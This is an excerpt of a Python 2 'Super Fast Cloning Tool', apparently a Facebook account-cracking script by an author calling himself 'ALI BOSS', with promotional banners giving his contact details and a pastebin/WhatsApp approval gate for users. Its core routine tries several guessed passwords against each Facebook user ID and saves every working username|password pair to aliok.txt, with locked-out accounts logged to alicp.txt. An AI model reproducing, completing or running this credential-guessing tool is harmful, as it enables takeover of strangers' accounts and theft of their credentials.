...
logo2 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY ALI BOSS\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m KOTLA JAM SARAIKI  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+9203044613877 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mTHE FIGHTER LARKAW ALI \n\x1b[1;91m-----------------------------------------------'
...
logo3 = '\n\x1b[1;92m / \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY ALI BOSS\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m KOTLA JAM SARAIKI  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+9203044613877 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mALI ABBAS \n\x1b[1;91m-----------------------------------------------'
...
def reg():
    ...
    time.sleep(1)
    try:
        to = open('/sdcard/Download/.ali-sweetu.jt', 'r').read()
    except (KeyError, IOError):
        reg2()
    try:
        r = requests.get('https://pastebin.com/u/h9ck3rAli786').text
    ...
    if to in r:
        ...
        os.system('xdg-open  https://youtube.com/c/KotlaJamSaraiki786')
        os.system('am start https://wa.me/+9203044613877?text=Please%20Give%20Me%20Approve%20Sir:%20' + to)
        reg()
...
def reg2():
    ...
    os.system('am start https://wa.me/https://youtube.com/c/KotlaJamSaraiki786?text=Please%20Give%20Me%20Approve%20Sir:%20' + id )
    os.system('am start https://wa.me/+9203044613877?text=Please%20Give%20Me%20Approve%20Sir:%20' + id )
    sav = open('/sdcard/Download/.ali-sweetu.jt', 'w')
    sav.write(id)
    sav.close()
...
def login():
    ...
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m Channal Open Hoga Subscribe Na Kia To'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m ALI BOSS OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
...
def Zeek():
    ...
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m ALI OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mALI-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('aliok.txt', 'a')
                okb.write(k + c + user + " | " + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mALI-cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                cps = open('alicp.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mALI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('aliok.txt', 'a')
                    okb.write(k + c + user + " | " + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mALI-cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('alicp.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mALI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('aliok.txt', 'a')
                        okb.write(k + c + user + " | " + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mALI-cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('alicp.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m [\x1b[1;92mALI-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass4
                            okb = open('aliok.txt', 'a')
                            okb.write(k + c + user + " | " + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [\x1b[1;91mALI-cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass4
                            cps = open('alicp.txt', 'a')
    ...
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Total \x1b[1;92mALI-OK/\x1b[1;91mALI-CP \x1b[1;93m: ' + str(len(oks)) + '/' + str(len(cpb))
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Cloned Accounts Has Been Saved\x1b[1;93m :\x1b[1;92m niki.txt'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Thanks For Using Ali Tool'
